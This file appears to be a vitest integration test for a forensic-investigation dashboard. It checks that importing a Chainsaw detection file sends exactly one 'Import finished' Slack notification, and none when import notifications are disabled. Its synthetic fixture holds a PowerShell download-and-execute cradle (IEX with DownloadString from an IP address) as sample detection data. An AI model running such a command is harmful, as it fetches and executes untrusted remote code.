import { describe, it, expect } from "vitest";
import { mkdtemp } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import request from "supertest";
import { CaseStore } from "../../src/storage/caseStore.js";
import { createApp, buildRuntimePipeline } from "../../src/server.js";
import { StateStore } from "../../src/analysis/stateStore.js";
import { ImportMetaStore } from "../../src/analysis/importMeta.js";
import { NotificationConfigStore } from "../../src/analysis/notificationStore.js";
import { createNotifier } from "../../src/integrations/notify/notifyDispatch.js";
import { POLL_TIMEOUT_MS, pollFor } from "../helpers/poll.js";

// #2978 — an upload through the dashboard's Import ends with one "import finished" message on a
// configured channel, carrying what it added. Synthetic data only.

const CHAINSAW = [
  {
    EventTime: "2025-12-05T03:02:24Z",
    Detection: "Malicious PowerShell Keywords",
    Severity: "high",
    "Rule Group": "Sigma",
    Computer: "WS-EXAMPLE-01",
    Channel: "Microsoft-Windows-PowerShell/Operational",
    EventID: 4104,
    SystemData: {
      Computer: "WS-EXAMPLE-01",
      EventID: 4104,
      TimeCreated_attributes: { SystemTime: "2025-12-05T03:02:24Z" },
    },
    EventData: { ScriptBlockText: "IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.7/a')" },
  },
];

async function makeApp(events?: { import?: boolean }) {
  const root = await mkdtemp(join(tmpdir(), "dfir-import-notify-"));
  const store = new CaseStore(root);
  const stateStore = new StateStore(store);
  const pipeline = buildRuntimePipeline({
    provider: undefined,
    synthesisProvider: undefined,
    stateStore,
    store,
    imageLoader: async () => ({ base64: "AAAA", mimeType: "image/webp" }),
  });
  const notificationStore = new NotificationConfigStore(join(root, "notifications", "config.json"));
  const bodies: string[] = [];
  const fetchFn = (async (_u: string, init?: { body?: unknown }) => {
    bodies.push(String(init?.body ?? ""));
    return new Response("ok", { status: 200 });
  }) as typeof fetch;
  const notifier = createNotifier({ store: notificationStore, fetchFn });
  const app = createApp(store, {
    pipeline,
    stateStore,
    importMetaStore: new ImportMetaStore(store),
    notificationStore,
    notifier,
  });
  await request(app).post("/cases").send({ caseId: "c1", name: "n", investigator: "i", aiProvider: null });
  await request(app)
    .post("/notifications")
    .send({
      type: "slack",
      webhookUrl: "https://hooks.slack.com/services/T/B/import",
      ...(events ? { events } : {}),
    });
  return { app, bodies };
}

describe("an upload's import-finished notification (#2978)", { timeout: POLL_TIMEOUT_MS * 3 }, () => {
  it("sends one message naming the file and what it added", async () => {
    const { app, bodies } = await makeApp();
    const res = await request(app)
      .post("/cases/c1/import")
      .send({ filename: "chainsaw.json", text: JSON.stringify(CHAINSAW) });
    expect(res.status).toBeLessThan(300);
    const sent = await pollFor("the import notification", async () => {
      const hits = bodies.filter((b) => b.includes("Import finished"));
      return hits.length ? hits : undefined;
    });
    expect(sent).toHaveLength(1);
    expect(sent[0]).toContain("chainsaw.json");
    expect(sent[0]).toMatch(/Forensic timeline: \+\d+ event/);
  });

  it("stays quiet on a channel with imports switched off", async () => {
    const { app, bodies } = await makeApp({ import: false });
    await request(app)
      .post("/cases/c1/import")
      .send({ filename: "chainsaw.json", text: JSON.stringify(CHAINSAW) });
    // The import lands (the meta record says so) before we check that nothing was sent for it.
    await pollFor("the import to finish", async () => {
      const meta = await request(app).get("/cases/c1/import-meta");
      return JSON.stringify(meta.body).includes("chainsaw.json") ? true : undefined;
    });
    await new Promise((r) => setTimeout(r, 300));
    expect(bodies.filter((b) => b.includes("Import finished"))).toHaveLength(0);
  });
});
